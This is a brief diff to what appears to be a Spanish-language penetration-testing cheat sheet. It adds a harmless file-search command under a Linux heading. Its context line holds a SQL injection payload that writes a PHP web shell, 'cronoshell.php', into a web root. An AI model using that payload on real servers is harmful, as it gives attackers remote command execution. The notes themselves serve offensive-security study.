@@ -217,6 +217,13 @@ select "<?php system($_GET[cmd]);?>" into outfile '/var/www/html/cronoshell.php'
 
 # Linux
 
+## Comandos utiles
+
+Buscar Archivos
+```
+find / -name nombre_archivo 2>/dev/null
+```
+
 ## Listeners
 
 Paquetes ICMP
